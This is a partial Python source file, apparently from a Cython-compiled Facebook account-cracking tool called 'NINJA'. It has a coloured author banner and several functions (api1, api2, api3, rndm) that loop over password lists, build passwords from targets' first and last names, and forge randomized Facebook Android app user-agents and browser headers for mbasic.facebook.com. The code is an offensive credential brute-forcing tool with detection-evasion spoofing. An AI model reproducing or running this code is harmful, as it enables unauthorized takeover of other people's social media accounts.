...
\033[1;37m××××××××××××××\033[1;33m××\033[1;33m××××××××\033[1;37m××××××××××××××××××××
  \033[1;37m[\033[1;37m+\033[1;37m] \033[1;37mAuthor  : \033[92msidou INF\033[1;32m
  \033[1;37m[\033[1;37m+\033[1;37m] \033[1;37mGithub  : TOOLS NINJA
  \033[1;37m[\033[1;37m+\033[1;37m] \033[1;37mService :\033[1;37m NINJA
  \033[1;37m[\033[1;37m+\033[1;37m] \033[1;37mVersion : 0.2
 \033[1;37m××××××××××××××\033[1;33m××\033[1;33m××××××××\033[1;37m×××××××××××××××××××""")
def linex():
...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/196.0.0.16;FBBV/19948677;FBDM/{density=2.0,width=796,height=2016};FBLC/zh_CN;FBCR/Google Wireless;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A136W;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
                li = ['28','29','210']
...
def api2(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/196.0.0.25;FBPN/com.facebook.orca;FBLC/is_IS;FBBV/14008944;FBCR/Du;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A125F;FBSV/11.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1266,height=2223};FB_FW/1;FBRV/33584174;]"
...
def api3(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/MessengerLite;FBAV/196.0.0.87;FBPN/com.facebook.mlite;FBLC/sl_SL;FBBV/61318726;FBCR/Du;FBMF/Samsung;FBBD/Samsung;FBDV/SM-A430F;FBSV/11.1;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=958,height=2380};]"
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/55.0.0.5693;FBPN/com.facebook.orca;FBLC/fa_IR;FBBV/654534351;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J320FN|LMY47V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=1115,height=2401};FB_FW/1;FBRV/654534351]"
